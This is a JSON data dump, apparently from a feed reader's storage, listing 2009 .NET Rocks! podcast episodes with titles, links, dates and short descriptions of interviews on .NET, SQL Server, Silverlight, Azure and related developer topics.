{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=475","title":"James Kovacs on Convention over Configuration","published":{"$wrap":"$date","v":1251172800000,"h":"2009-08-25T04:00:00.000Z"},"starred":false,"read":false,"content":"James Kovacs is back to talk about how the idea of Convention over Configuration has transformed the way we think about software development, leading to better usability and productivity.","author":false,"_id":{"$wrap":"$oid","v":417}}
{"k":"0000000082","o":"0000000525","v":"001"}
{"_id":418,"_uid":418,"_dt":1373728934048,"_s":"bc6fdf0e5b29362f1f0151d9ec5fde53"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=474","title":"Christian Gross: Death of the Speaker?","published":{"$wrap":"$date","v":1250740800000,"h":"2009-08-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Christian Gross talks about the nascent death of the professional speaker. What is happening to the big technical conferences? How does that fare for the pro speaker? Are the glory days over? Does anyone care?","author":false,"_id":{"$wrap":"$oid","v":418}}
{"k":"0000000082","o":"0000000427","v":"001"}
{"_id":419,"_uid":419,"_dt":1373728934049,"_s":"80ec7e6d1f08972f02e4ad6e88e7931b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=473","title":"Joel Semeniuk on the State of Team System","published":{"$wrap":"$date","v":1250568000000,"h":"2009-08-18T04:00:00.000Z"},"starred":false,"read":false,"content":"Joel Semeniuk is back to catch us up on Visual Studio Team System. Problems solved and features yet to come.","author":false,"_id":{"$wrap":"$oid","v":419}}
{"k":"0000000082","o":"0000000412","v":"001"}
{"_id":420,"_uid":420,"_dt":1373728934050,"_s":"71b899b8b0cfdc1f5158b7537cbc96ed"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=472","title":"Steve Evans on IT for Developers","published":{"$wrap":"$date","v":1250136000000,"h":"2009-08-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Steve Evans talks to Richard and Carl about what developers need to know on the IT side of technology.","author":false,"_id":{"$wrap":"$oid","v":420}}
{"k":"0000000082","o":"0000000489","v":"001"}
{"_id":421,"_uid":421,"_dt":1373728934050,"_s":"8450c5628e5f8bca52385a0a6070a014"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=471","title":"Vishwas Lele on Real-World Azure","published":{"$wrap":"$date","v":1249963200000,"h":"2009-08-11T04:00:00.000Z"},"starred":false,"read":false,"content":"Vishwas is back to talk about his experiences programming for Microsoft Windows Azure. Vishwas did a port of the famous DinnerNow website using the Azure cloud computing platform.","author":false,"_id":{"$wrap":"$oid","v":421}}
{"k":"0000000082","o":"0000000431","v":"001"}
{"_id":422,"_uid":422,"_dt":1373728934051,"_s":"052ecdccdd775d851649c0de1f35a1b3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=470","title":"Nate Kohari on the Zen of Project Management!","published":{"$wrap":"$date","v":1249531200000,"h":"2009-08-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Nate Kohari about lean project management, and Zen, a lean project management tool.","author":false,"_id":{"$wrap":"$oid","v":422}}
{"k":"0000000082","o":"0000000460","v":"001"}
{"_id":423,"_uid":423,"_dt":1373728934052,"_s":"4232a3707385d8bacbe62c28c7eb8d5c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=469","title":"Brad Cunningham on Touch Technology","published":{"$wrap":"$date","v":1249358400000,"h":"2009-08-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Brad Cunningham talks about developing touch-based applications, and the various technologies manufacturers are using for touch-based applications.","author":false,"_id":{"$wrap":"$oid","v":423}}
{"k":"0000000082","o":"0000000444","v":"001"}
{"_id":424,"_uid":424,"_dt":1373728934053,"_s":"c821e950b2510b22f93164ea4004bbff"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=468","title":"Glenn Howes Sets Us Straight on iPhone Dev!","published":{"$wrap":"$date","v":1248926400000,"h":"2009-07-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Alert listener and iPhone developer Glenn Howes gives us the real story on iPhone development from a different perspective.","author":false,"_id":{"$wrap":"$oid","v":424}}
{"k":"0000000082","o":"0000000885","v":"001"}
{"_id":425,"_uid":425,"_dt":1373728934053,"_s":"b572187c6dccbe65c8dbd0ca7b7eb92b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=467","title":"Kiciman and Friedman Bring AjaxView to Studio!","published":{"$wrap":"$date","v":1248747851000,"h":"2009-07-28T02:24:11.000Z"},"starred":false,"read":false,"content":"Emre Kiciman and Mark Friedman talk about bringing AjaxView to Visual Studio. Emre previously talked about AjaxView on .NET Rocks when it was a Microsoft Research project to enable developers to profile the behavior of JavaScript on the browser. Since then, AjaxView has been developed as the Microsoft Visual Studio AJAX Profiling Extensions. Mark as part of the Studio team focused on making AjaxView work in Studio. The conversation not only digs into what AjaxView can do for a developer, but the challenges of bringing a research project to the mainstream.","author":false,"_id":{"$wrap":"$oid","v":425}}
{"k":"0000000082","o":"0000000488","v":"001"}
{"_id":426,"_uid":426,"_dt":1373728934054,"_s":"da18820ce7eb5d75daa094223584a781"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=466","title":"Ananth B on Brahma!","published":{"$wrap":"$date","v":1248321600000,"h":"2009-07-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Ananth B talks about Brahma, an open-source library written for the .NET 3.5 framework (in C# 3.0), to provide high level access to parallel streaming computations on a variety of processors.","author":false,"_id":{"$wrap":"$oid","v":426}}
{"k":"0000000082","o":"0000000440","v":"001"}
{"_id":427,"_uid":427,"_dt":1373728934055,"_s":"957c4d3eaaf0b98241511b930e77acb9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=465","title":"Roman Schindlauer on Complex Events","published":{"$wrap":"$date","v":1248148800000,"h":"2009-07-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Roman Schindlauer on Complex Event Processing (CEP) and Microsoft's Platform for CEP using SQL Server.","author":false,"_id":{"$wrap":"$oid","v":427}}
{"k":"0000000082","o":"0000000491","v":"001"}
{"_id":428,"_uid":428,"_dt":1373728934056,"_s":"86c673735ec3a752fe3f26d663e897a4"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=464","title":"Aaron Erickson Identifies the Seven Deadly Firms","published":{"$wrap":"$date","v":1247716800000,"h":"2009-07-16T04:00:00.000Z"},"starred":false,"read":false,"content":"Aaron Erickson talks with Carl and Richard about the various 7 anti-patterns of the tech consulting business. His book is a veritable survival guide for consultants.","author":false,"_id":{"$wrap":"$oid","v":428}}
{"k":"0000000082","o":"0000000352","v":"001"}
{"_id":429,"_uid":429,"_dt":1373728934057,"_s":"9c3981e4003dbbc2e66251e2eae5d958"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=463","title":"Brian Noyes on Workflow 4.0","published":{"$wrap":"$date","v":1247544000000,"h":"2009-07-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Brian Noyes talks about Workflow Foundation 4.0","author":false,"_id":{"$wrap":"$oid","v":429}}
{"k":"0000000082","o":"0000000400","v":"001"}
{"_id":430,"_uid":430,"_dt":1373728934058,"_s":"874129b5d86964a2f43588b6df9e6458"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=462","title":"Paul Stubbs on Silverlight in Sharepoint","published":{"$wrap":"$date","v":1247112000000,"h":"2009-07-09T04:00:00.000Z"},"starred":false,"read":false,"content":"Pual Stubbs from Microsoft talks about the marriage of Silverlight and Sharepoint.","author":false,"_id":{"$wrap":"$oid","v":430}}
{"k":"0000000082","o":"0000000445","v":"001"}
{"_id":431,"_uid":431,"_dt":1373728934058,"_s":"1689475632355ee447c098f2696d6c6d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=461","title":"Stephen Forte on Data Access Options","published":{"$wrap":"$date","v":1246939200000,"h":"2009-07-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Forte is back talking about all the options .NET developers have for data access, and gives some guidelines as to when to use what.","author":false,"_id":{"$wrap":"$oid","v":431}}
{"k":"0000000082","o":"0000000442","v":"001"}
{"_id":432,"_uid":432,"_dt":1373728934059,"_s":"85378c21f94a795cb200c96d46f273f2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=460","title":"Scott Ambler on the Agile Process Maturity Model","published":{"$wrap":"$date","v":1246507200000,"h":"2009-07-02T04:00:00.000Z"},"starred":false,"read":false,"content":"Scott Ambler from IBM talks about the Agile Process Maturity Model, which defines three levels of Agile methodology.","author":false,"_id":{"$wrap":"$oid","v":432}}
{"k":"0000000082","o":"0000000444","v":"001"}
{"_id":433,"_uid":433,"_dt":1373728934060,"_s":"0c62e9da05cac2db2c99ed8033ed2b10"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=459","title":"Michael Stiefel on Cloud Computing","published":{"$wrap":"$date","v":1246334400000,"h":"2009-06-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Michael Stiefel is back to talk about the realities of Cloud Computing including offerings from Amazon, Google, and Microsoft Azure.","author":false,"_id":{"$wrap":"$oid","v":433}}
{"k":"0000000082","o":"0000000478","v":"001"}
{"_id":434,"_uid":434,"_dt":1373728934060,"_s":"c6bde0190b50e1ec7c95e03f5fc86e9b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=458","title":"Scott Hanselman and Phil Haack at NDC!","published":{"$wrap":"$date","v":1245902400000,"h":"2009-06-25T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talked to Scott Hanselman and Phil Haack live on stage at the Norweigian Developer's Conference last week about new and cool toys and technology.","author":false,"_id":{"$wrap":"$oid","v":434}}
{"k":"0000000082","o":"0000000383","v":"001"}
{"_id":435,"_uid":435,"_dt":1373728934061,"_s":"4cd84d1d99e3efe18b8bccb46b113f6f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=457","title":"Sahil Malik's Sharepoint Checklist","published":{"$wrap":"$date","v":1245729600000,"h":"2009-06-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Sahil Malik tells us what every developer should know about Sharepoint.","author":false,"_id":{"$wrap":"$oid","v":435}}
{"k":"0000000082","o":"0000000466","v":"001"}
{"_id":436,"_uid":436,"_dt":1373728934062,"_s":"7315d0e88226ec5c251bc67b92ce1dc3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=456","title":"Jason Diller and Daniel Crenna on TweetSharp","published":{"$wrap":"$date","v":1245297600000,"h":"2009-06-18T04:00:00.000Z"},"starred":false,"read":false,"content":"TweetSharp is a .NET library for developing Twitter applications. Yeah, that's what I thought too until we talked to these guys! You'll want it.","author":false,"_id":{"$wrap":"$oid","v":436}}
{"k":"0000000082","o":"0000000464","v":"001"}
{"_id":437,"_uid":437,"_dt":1373728934062,"_s":"12c8e210ae529c442f9f42744d3fe243"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=455","title":"Paul Randal on Developers and Databases","published":{"$wrap":"$date","v":1245124800000,"h":"2009-06-16T04:00:00.000Z"},"starred":false,"read":false,"content":"We catch up with Paul Randal, previously with the Microsoft SQL Server team, about all the little details of SQL Server all developers should know.","author":false,"_id":{"$wrap":"$oid","v":437}}
{"k":"0000000082","o":"0000000422","v":"001"}
{"_id":438,"_uid":438,"_dt":1373728934063,"_s":"841fa2cecc0ac63701671dc7c0f5d265"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=454","title":"Rory does iPhones!","published":{"$wrap":"$date","v":1244692800000,"h":"2009-06-11T04:00:00.000Z"},"starred":false,"read":false,"content":"Rory Blyth comes back to .NET Rocks! with stories of a .NET developer turned iPhone developer. Learn how the other half lives!","author":false,"_id":{"$wrap":"$oid","v":438}}
{"k":"0000000082","o":"0000000415","v":"001"}
{"_id":439,"_uid":439,"_dt":1373728934064,"_s":"04055cfa54c036989828c4ba64950b24"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=453","title":"Peter Vogel uses Code Generation","published":{"$wrap":"$date","v":1244520000000,"h":"2009-06-09T04:00:00.000Z"},"starred":false,"read":false,"content":"Peter Vogel talks about code generation pros, cons, technologies, and strategies from Visual Studio to T4","author":false,"_id":{"$wrap":"$oid","v":439}}
{"k":"0000000082","o":"0000000504","v":"001"}
{"_id":440,"_uid":440,"_dt":1373728934064,"_s":"8b044c352310cccc31dfb5c607a811fd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=452","title":"Eric Lee Builds Great Demos and WF2WPF","published":{"$wrap":"$date","v":1244088000000,"h":"2009-06-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Eric Lee from Microsoft talks about his experiences developing live demos for the likes of Steve Ballmer. Then he digs into his codeplex project, WinForms to WPF. Check it out on codeplex!","author":false,"_id":{"$wrap":"$oid","v":440}}
{"k":"0000000082","o":"0000000410","v":"001"}
{"_id":441,"_uid":441,"_dt":1373728934065,"_s":"996005d9c81764d8222af6f831748b5f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=451","title":"Dan Simmons Talks EF Version 4","published":{"$wrap":"$date","v":1243915200000,"h":"2009-06-02T04:00:00.000Z"},"starred":false,"read":false,"content":"Daniel Simmons is back this time to talk about the new features of ADO.NET Entity Framework version 4.","author":false,"_id":{"$wrap":"$oid","v":441}}
{"k":"0000000082","o":"0000000441","v":"001"}
{"_id":442,"_uid":442,"_dt":1373728934066,"_s":"54be6fa54fc96aa1ac4e65f039e954a5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=450","title":"Nicholas Blumhardt on Autofac","published":{"$wrap":"$date","v":1243569600000,"h":"2009-05-29T04:00:00.000Z"},"starred":false,"read":false,"content":"The .NET dudes talk to Nicholas Blumhardt about Autofac, an IoC container that uses lambda expressions in C# 3.0 to create components.","author":false,"_id":{"$wrap":"$oid","v":442}}
{"k":"0000000082","o":"0000000412","v":"001"}
{"_id":443,"_uid":443,"_dt":1373728934067,"_s":"4ca92c77ea9ad42235e9f0449eceb0ff"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=449","title":"Axum!","published":{"$wrap":"$date","v":1243396800000,"h":"2009-05-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Nickolas Gustafsson and Josh Phillips about Axum, a new language developed specifically for parallelism.","author":false,"_id":{"$wrap":"$oid","v":443}}
{"k":"0000000082","o":"0000000357","v":"001"}
{"_id":444,"_uid":444,"_dt":1373728934067,"_s":"10c206dedfa19eb617cc99a244da35ed"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=448","title":"Ten Things that Annoy Miguel Castro","published":{"$wrap":"$date","v":1242878400000,"h":"2009-05-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Miguel Castro shares his list of pet peeves.","author":false,"_id":{"$wrap":"$oid","v":444}}
{"k":"0000000082","o":"0000000469","v":"001"}
{"_id":445,"_uid":445,"_dt":1373728934068,"_s":"b50e910e9e1575b36a21150a27b453ad"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=447","title":"Peter DeBetta and Adam Machanic on creating good SQL databases","published":{"$wrap":"$date","v":1242705600000,"h":"2009-05-19T04:00:00.000Z"},"starred":false,"read":false,"content":"Peter and Adam talk about creating good SQL Server databases. We figured it was about time we did a good old fashioned data show!","author":false,"_id":{"$wrap":"$oid","v":445}}
{"k":"0000000082","o":"0000000449","v":"001"}
{"_id":446,"_uid":446,"_dt":1373728934069,"_s":"9a47e6fa64ca1d3eb66261df7d6021ee"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=446","title":"Doug Turnure and Johanna White are Ramping Up!","published":{"$wrap":"$date","v":1242273600000,"h":"2009-05-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Doug Turnure and Johanna White talk about the Ramp Up, an online program that assists users in learning Microsoft technology.","author":false,"_id":{"$wrap":"$oid","v":446}}
{"k":"0000000082","o":"0000000380","v":"001"}
{"_id":447,"_uid":447,"_dt":1373728934069,"_s":"5a61d8c6da45eeeb12451117567e31ed"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=445","title":"Kenn Scribner on REST","published":{"$wrap":"$date","v":1242100800000,"h":"2009-05-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Kenn Scribner about REST, its origins and intended uses.","author":false,"_id":{"$wrap":"$oid","v":447}}
{"k":"0000000082","o":"0000000415","v":"001"}
{"_id":448,"_uid":448,"_dt":1373728934070,"_s":"b592603c82b212e7e719159ddfeb8dc8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=444","title":"Ted Neward on Oracle buying Sun","published":{"$wrap":"$date","v":1241668800000,"h":"2009-05-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Ted Neward about Sun being bought by Oracle, and other musings in the Java space.","author":false,"_id":{"$wrap":"$oid","v":448}}
{"k":"0000000082","o":"0000000446","v":"001"}
{"_id":449,"_uid":449,"_dt":1373728934071,"_s":"1dd5a2b24ae8ad3a8d8f2a41436c035e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=443","title":"Kate Gregory Still Programs in C++!","published":{"$wrap":"$date","v":1241496000000,"h":"2009-05-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Attack of the Canadians!! In this show Kate gets hardcore, talking about C++, VC10, the Vista Bridge, and a few other technical gems.","author":false,"_id":{"$wrap":"$oid","v":449}}
{"k":"0000000082","o":"0000000381","v":"001"}
{"_id":450,"_uid":450,"_dt":1373728934071,"_s":"dc998952b0a0c38749a109645fcf9d9a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=442","title":"Dino Esposito Gets Architectural!","published":{"$wrap":"$date","v":1241064000000,"h":"2009-04-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Dino Esposito is back to share his latest thoughts about architecture.","author":false,"_id":{"$wrap":"$oid","v":450}}
{"k":"0000000082","o":"0000000462","v":"001"}
{"_id":451,"_uid":451,"_dt":1373728934072,"_s":"88c9685e153d6faadc99fa7bacd2acf0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=441","title":"Shawn Wildermuth on Silverlight 3.0","published":{"$wrap":"$date","v":1240891200000,"h":"2009-04-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Shawn Wildermuth talks about the new features in Silverlight 3.0. Shawn brings a wealth of knowledge and experience to the table. Lots of great tips!","author":false,"_id":{"$wrap":"$oid","v":451}}
{"k":"0000000082","o":"0000000410","v":"001"}
{"_id":452,"_uid":452,"_dt":1373728934073,"_s":"6ae19d300174b916737f26857805f6fa"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=440","title":"Jeff Atwood talks Stack Overflow","published":{"$wrap":"$date","v":1240459200000,"h":"2009-04-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk with Jeff Atwood about Stack Overflow and effective problem solving solutions.","author":false,"_id":{"$wrap":"$oid","v":452}}
{"k":"0000000082","o":"0000000513","v":"001"}
{"_id":453,"_uid":453,"_dt":1373728934074,"_s":"30f22acac27288c061a62df57665100f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=439","title":"Jonas Folleso on UI Framework Choices","published":{"$wrap":"$date","v":1240286400000,"h":"2009-04-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Jonas Folleso of Norway talks to Carl and Richard about which User Interface we chose for our applications. ASP.NET Ajax, Silverlight 3, WPF, Windows Forms) and his insights into these technologies.","author":false,"_id":{"$wrap":"$oid","v":453}}
{"k":"0000000082","o":"0000000544","v":"001"}
{"_id":454,"_uid":454,"_dt":1373728934075,"_s":"037c4313665a20e8e1f721b4741c847c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=438","title":"Pat Hynds on why projects fail","published":{"$wrap":"$date","v":1239854400000,"h":"2009-04-16T04:00:00.000Z"},"starred":false,"read":false,"content":"Patrick Hynds (our first guest) is back to talk about his experiences and research on why software projects fail. New statistics show that even with agile methodologies such as Test-Driven-Development, most software projects still fail.","author":false,"_id":{"$wrap":"$oid","v":454}}
{"k":"0000000082","o":"0000000570","v":"001"}
{"_id":455,"_uid":455,"_dt":1373728934075,"_s":"558b76f4ef9e0695648f1c37bb2d7119"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=437","title":"Bob Beauchemin Gets Spatial in SQL Server 2008!","published":{"$wrap":"$date","v":1239681600000,"h":"2009-04-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Bob Beauchemin talks to Carl and Richard about spatial data types in SQL Server 2008, and the types of applications that lend themselves well to it. He also discusses the similarities and differences of the spatial data support in Virtual Earth.","author":false,"_id":{"$wrap":"$oid","v":455}}
{"k":"0000000082","o":"0000000402","v":"001"}
{"_id":456,"_uid":456,"_dt":1373728934076,"_s":"f3d4cbbdf8cf4a63ac1df110b4ec3dbd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=436","title":"Kathleen Dollard on MEF and More!","published":{"$wrap":"$date","v":1239249600000,"h":"2009-04-09T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk with Kathleen Dollard about MEF, the future of development, and more.","author":false,"_id":{"$wrap":"$oid","v":456}}
{"k":"0000000082","o":"0000000476","v":"001"}
{"_id":457,"_uid":457,"_dt":1373728934077,"_s":"f716a9600dd2f12548713a315460e7de"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=435","title":"Don Kiely on AJAX at DevConnections!","published":{"$wrap":"$date","v":1239076800000,"h":"2009-04-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Recorded live at DevConnections Orlando 2009, Don Kiely is back to talk about AJAX old and new (ASP.NET AJAX 4.0 is just out), and a few other things on his mind.","author":false,"_id":{"$wrap":"$oid","v":457}}
{"k":"0000000082","o":"0000000487","v":"001"}
{"_id":458,"_uid":458,"_dt":1373728934078,"_s":"bbee7ad8e1be17b5c4820f33c82ee933"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=434","title":"Arun Kishan on The Windows Kernel","published":{"$wrap":"$date","v":1238817600000,"h":"2009-04-04T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Arun Kishan about all things Windows. The OS kernel is a mystery to most. This is a laid back discussion about Windows from a developers point of view.","author":false,"_id":{"$wrap":"$oid","v":458}}
{"k":"0000000082","o":"0000000535","v":"001"}
{"_id":459,"_uid":459,"_dt":1373728934079,"_s":"d3e30e656ce84b40b1ff865b8a3bf5eb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=433","title":"Phil Haack on ASP.NET MVC RTM!!","published":{"$wrap":"$date","v":1238472000000,"h":"2009-03-31T04:00:00.000Z"},"starred":false,"read":false,"content":"There's some acronym soup for ya! Phil talks about the differences in the MVP and MVC patterns, some other patterns emerging out of MVP, and of course the ASP.NET MVC Framework, recently released to manufacturing by Microsoft!","author":false,"_id":{"$wrap":"$oid","v":459}}
{"k":"0000000082","o":"0000000484","v":"001"}
{"_id":460,"_uid":460,"_dt":1373728934080,"_s":"cc5cabdc29c6428f015c104f0d32fa88"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=432","title":"Catching up with Russ Fustino","published":{"$wrap":"$date","v":1238040000000,"h":"2009-03-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Russ Fustino is back in the limelight with a new TV show \"It's All About The Tools\" He talks about his experiences on the road, as one of the busiest evangelists at Microsoft.","author":false,"_id":{"$wrap":"$oid","v":460}}
{"k":"0000000082","o":"0000000428","v":"001"}
{"_id":461,"_uid":461,"_dt":1373728934080,"_s":"efc0d7979fb1547b8f39f6656523a6b8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=431","title":"Jim Duffy Lives on a Virtual Earth","published":{"$wrap":"$date","v":1237867200000,"h":"2009-03-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Jim Duffy offers up the latest and greatest about Virtual Earth. You may be surprised about what you can do with it!","author":false,"_id":{"$wrap":"$oid","v":461}}
{"k":"0000000082","o":"0000000410","v":"001"}
{"_id":462,"_uid":462,"_dt":1373728934081,"_s":"c774543296a9fd6866b7257def6926d2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=430","title":"Abrams and Kothari Talk MIX09!","published":{"$wrap":"$date","v":1237435200000,"h":"2009-03-19T04:00:00.000Z"},"starred":false,"read":false,"content":"Brad Abrams and Nikhil Kothari are back to fill us in on what was announced and discussed at Mix 2009!","author":false,"_id":{"$wrap":"$oid","v":462}}
{"k":"0000000082","o":"0000000376","v":"001"}
{"_id":463,"_uid":463,"_dt":1373728934082,"_s":"7bf9f1065aa0db7b292fa0a94b346fd8"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=429","title":"Michael Foord Talks IronPython","published":{"$wrap":"$date","v":1237262400000,"h":"2009-03-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Michael Foord talks with the .NET Dudes about IronPython and Python.","author":false,"_id":{"$wrap":"$oid","v":463}}
{"k":"0000000082","o":"0000000484","v":"001"}
{"_id":464,"_uid":464,"_dt":1373728934082,"_s":"b3a30e0923a8cb37b13087d245a8aadf"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=428","title":"Mike Nash Talks IE8 and Windows 7!","published":{"$wrap":"$date","v":1236830400000,"h":"2009-03-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Mike Nash from the Windows Platform Strategy group about IE8, Windows 7, and everything else that goes on day to day in the life of a Corporate VP.","author":false,"_id":{"$wrap":"$oid","v":464}}
{"k":"0000000082","o":"0000000451","v":"001"}
{"_id":465,"_uid":465,"_dt":1373728934083,"_s":"3766ca04c9ec09de38414114f31c12c1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=427","title":"Tess Ferrandez on Debugging","published":{"$wrap":"$date","v":1236657600000,"h":"2009-03-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Tess Ferrandez about her experiences as an escalation engineer at Microsoft, focusing on debugging and memory management.","author":false,"_id":{"$wrap":"$oid","v":465}}
{"k":"0000000082","o":"0000000721","v":"001"}
{"_id":466,"_uid":466,"_dt":1373728934084,"_s":"8e44df031e5a209591584b70e2654c2c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=426","title":"Rob Boucher on Application Architecture Guidance!","published":{"$wrap":"$date","v":1236225600000,"h":"2009-03-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Rob Boucher talks about a very helpful (and free!) application architecture guide contributed to by the who's who in the .NET Community, both inside and outside of Microsoft. You'll pick up some great tips. Writers: J.D. Meier (Project Lead), Alex Homer, David Hill, Jason Taylor, Prashant Bansode, Lonnie Wall, Rob Boucher Jr., Akshay Bogawat, Praveen Rangarajan (Test), and Dennis Rea (Edit).","author":false,"_id":{"$wrap":"$oid","v":466}}
{"k":"0000000082","o":"0000000689","v":"001"}
{"_id":467,"_uid":467,"_dt":1373728934085,"_s":"ab65bc3519fd581df67fb247d6c1c678"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=425","title":"Lee Zuckett on the Customer Care Framework","published":{"$wrap":"$date","v":1236052800000,"h":"2009-03-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Lee Zuckett from Microsoft talks about the Microsoft Customer Care Framework, which helps companies create valuable customer relationships by improving the customer experience across all interaction channels -phone, e-mail, chat, and web-bringing together disparate information from different applications into one view, without having to re-enter the same information.","author":false,"_id":{"$wrap":"$oid","v":467}}
{"k":"0000000082","o":"0000000374","v":"001"}
{"_id":468,"_uid":468,"_dt":1373728934085,"_s":"08ff40c479e69fee651c8e692018f5a5"}
